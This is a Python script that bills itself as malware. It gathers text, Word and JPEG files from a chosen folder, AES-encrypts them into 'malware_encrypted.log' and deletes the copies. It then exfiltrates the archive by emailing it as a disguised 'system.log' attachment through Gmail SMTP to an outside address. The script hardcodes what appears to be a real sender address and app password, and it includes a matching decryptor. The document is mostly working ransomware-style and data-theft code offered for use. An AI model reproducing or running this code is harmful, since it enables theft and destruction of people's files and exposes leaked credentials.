import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# ===== COMBINED FILE COLLECTOR =====
def collect_files(source_dir, output_folder):
    """Collect .txt, .docx, .jpg files into a folder."""
    os.makedirs(output_folder, exist_ok=True)
    for root, _, files in os.walk(source_dir):
        for file in files:
            if file.lower().endswith(('.txt', '.docx', '.jpg')):
                src = os.path.join(root, file)
                dest = os.path.join(output_folder, file)
                shutil.copy2(src, dest)
    return output_folder

# ===== ENCRYPTION =====
def encrypt_folder(folder_path, password):
    """Encrypt folder to 'malware_encrypted.log'."""
    try:
        # Create ZIP
        shutil.make_archive('temp_archive', 'zip', folder_path)
        
        # Generate IV + key
        iv = os.urandom(16)
        salt = os.urandom(16)
        key = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        ).derive(password.encode())
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
        encryptor = cipher.encryptor()
        with open('temp_archive.zip', 'rb') as f:
            data = f.read()
            padded = data + bytes([16 - len(data) % 16] * (16 - len(data) % 16))  # PKCS#7 padding
            encrypted = iv + salt + encryptor.update(padded) + encryptor.finalize()
        
        # Save encrypted file
        with open('malware_encrypted.log', 'wb') as f:
            f.write(encrypted)
        
        # Cleanup
        os.remove('temp_archive.zip')
        shutil.rmtree(folder_path)
        return True
    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        return False


# ===== DECRYPTION =====
def decrypt_file(encrypted_path, password):
    """Decrypt function for recall.py with full path handling"""
    try:
        # Path normalization
        encrypted_path = os.path.abspath(os.path.normpath(encrypted_path.strip('"\'')))
        print(f"\n[*] Verifying: {encrypted_path}")
        
        if not os.path.isfile(encrypted_path):
            print(f"[!] CRITICAL: File not found")
            print(f"[*] Current directory: {os.getcwd()}")
            print("\nFiles in target folder:")
            for f in os.listdir(os.path.dirname(encrypted_path)):
                print(f"- {f}")
            return False
        
        # Read encrypted data
        with open(encrypted_path, "rb") as f:
            iv = f.read(16)
            salt = f.read(16)
            ciphertext = f.read()
        
        # Key derivation
        key = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        ).derive(password.encode())
        
        # Decryption
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        decrypted = decrypted[:-decrypted[-1]]  # Remove padding
        
        # Output handling
        output_folder = "decrypted_files"
        os.makedirs(output_folder, exist_ok=True)
        
        temp_zip = os.path.join(output_folder, "temp_recovered.zip")
        with open(temp_zip, "wb") as f:
            f.write(decrypted)
        
        shutil.unpack_archive(temp_zip, output_folder, "zip")
        os.remove(temp_zip)
        
        print(f"\n[+] DECRYPTION SUCCESSFUL!")
        print(f"[*] Files saved to: {os.path.abspath(output_folder)}")
        return True
        
    except ValueError:
        print("\n[!] Invalid password or corrupted file!")
    except Exception as e:
        print(f"\n[!] FATAL ERROR: {str(e)}")
    return False
# ===== EXFILTRATION =====
def exfiltrate_data():
    """Send encrypted file via email."""
    try:
        msg = MIMEMultipart()
        msg['From'] = "m7md7azem17@gmail.com"
        msg['To'] = "mh2200696@tkh.edu.eg"
        msg['Subject'] = "System Report"
        
        with open('malware_encrypted.log', 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="system.log"')
        msg.attach(part)
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login("m7md7azem17@gmail.com", "uuil ppot yonl kxcj")
            server.send_message(msg)
        return True
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return False

# ===== MAIN MENU =====
def main():
    print("""
    ███╗   ███╗ █████╗ ██╗  ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
    ████╗ ████║██╔══██╗██║ ██╔╝██║    ██║██╔══██╗██╔══██╗██╔════╝
    ██╔████╔██║███████║█████╔╝ ██║ █╗ ██║███████║██████╔╝█████╗  
    ██║╚██╔╝██║██╔══██║██╔═██╗ ██║███╗██║██╔══██║██╔══██╗██╔══╝  
    ██║ ╚═╝ ██║██║  ██║██║  ██╗╚███╔███╔╝██║  ██║██║  ██║███████╗
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    """)

    while True:
        print("\n[1] Encrypt & Exfiltrate")
        print("[2] Decrypt")
        print("[3] Exit")
        choice = input("\n>>> Choose an option (1/2/3): ").strip()

        if choice == '1':
            # Encrypt
            target_folder = input("\n[?] Enter folder path to encrypt: ").strip()
            if not os.path.exists(target_folder):
                print("[!] Folder does not exist!")
                continue

            password = input("[?] Set encryption password: ").strip()
            print("\n[+] Collecting files...")
            collected = collect_files(target_folder, "malware_target")
            
            print("[+] Encrypting...")
            if encrypt_folder(collected, password):
                print("\n[✔] Folder encrypted as 'malware_encrypted.log'!")
                if input("[?] Exfiltrate data? (y/n): ").lower() == 'y':
                    exfiltrate_data()

        elif choice == '2':
            # Decrypt
            encrypted_file = input("\n[?] Path to 'malware_encrypted.log': ").strip()
            if not os.path.exists(encrypted_file):
                print("[!] File not found!")
                continue
            
            password = input("[?] Enter decryption password: ").strip()
            print("\n[+] Decrypting...")
            if decrypt_file(encrypted_file, password):
                print("\n[✔] Files decrypted to 'decrypted_files' folder!")

        elif choice == '3':
            print("\n[+] Exiting...")
            break

        else:
            print("\n[!] Invalid choice!")

if __name__ == "__main__":
    main()